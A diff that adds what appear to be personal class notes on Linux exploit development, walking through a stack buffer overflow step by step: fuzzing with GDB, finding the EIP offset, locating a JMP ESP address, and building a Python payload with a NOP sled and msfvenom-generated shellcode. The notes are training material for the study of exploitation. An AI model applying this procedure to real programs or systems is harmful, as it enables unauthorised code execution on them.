@@ -409,4 +409,116 @@
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+# Day 5: Exploit Development - Linux
+
+## Buffer Overflow
+  ### Common Terms
+      -HEAP
+      -STACK
+      -REGISTERS
+      -INSTRUCTION POINTER (IP)
+      -STACK POINTER (SP)
+      -BASE POINTER (BP)
+      -FUNCTION
+      -SHELLCODE
+
+  ### Defenses
+      -NON exectuable stack
+      -Address SPace Layout Randomization
+      -Data Execution Prevention (DEP)
+      -Stack Canaries
+      -Position Independent Executable
+
+  ### Demo
+    -1. Run: file <file> to see what kind of exectuable
+    -2. Run: strings <file> - parse through 
+    -3. Run: chmod u+x <file>
+    -4. Run the file  
+        -Command substituton: ./<file> $(echo: "<input>") or add <<<
+        -Fuzz the program, add a bunch of characters
+
+      
+    -5. Launch GDB- Run: gdb ./<file>
+        -Run shell for shell ; exit for back into gdb
+
+    -6. Run program: run
+
+    -7. Ctrl + C, Run: info functions to spit out all functions
+
+    -8. Run: pdisass main | to disassemble main
+      -Focus/Take note: get user input
+
+    -9. Run: pdisass getuserinput | dissassemble getuserinput
+
+    -10. Run: vim <name>.py | script to test BFO
+            -#!/usr/bin/env python
+            -
+            -offset = "A" * 100
+
+            -print(offset)
+            
+            -wq!
+
+    -11. IN GDP:  run <<<$(python ./<name>.py)
+      -Verify the program broke with the EIP:0x4141
+
+    -12. Go to wiremask.eu & get 100 character string; replace offset with new string
+
+    -13. Plug EIP value into 'find the offset' in wiremask
+
+    -14. Once offset found- 
+          -a. Go back into code and replace offset: offset = "A" * new number
+          -b. add line of code: eip = "BBBB"
+          -c. add: print(offset+eip)
+          -d. make sure EIP = BBBB in output
+
+    -15. run: shell
+          -a. in regular shell run: env - gdb ./<name> (** ON TARGET **)
+          -b. run: unset env LINES  (** ON TARGET **)
+          -c. run: unset env COLUMNS (** ON TARGET **)
+          -d. run: run (** ON TARGET **)
+          -e. Ctrl + C to interrupt (** ON TARGET **)
+          -f. run: info proc map
+          -g. Copy hex memory add of: line directly after heap | line of [stack]
+          -h. run: find /b [line after heap],[line of stack], 0xff, 0xe4
+          -i. Copy first 4 addresses, paste into py script as comments
+          -j. Reverse the firstaddresses from big to little endian
+            -I. ex: 0xf7 de 3b 59 -> \x59\x3b\xde\xf7
+          -k. Replace eip variable with little endian
+          -l. Add line in script under eip: nop = "\x90" * 15
+          -m. Add + nop to print statement
+
+     -16. Open new terminal
+         -a. run: msfvenom -p linux/x86/exec CMD=<cmd> -b '\0x00' -f python
+         -b. Copy everything with buf = 
+         -c. paste into script under nop
+         -d. add + buf to print statement
+          
+          
+
+
+      
+
+      :
+
+
+
+
+
       
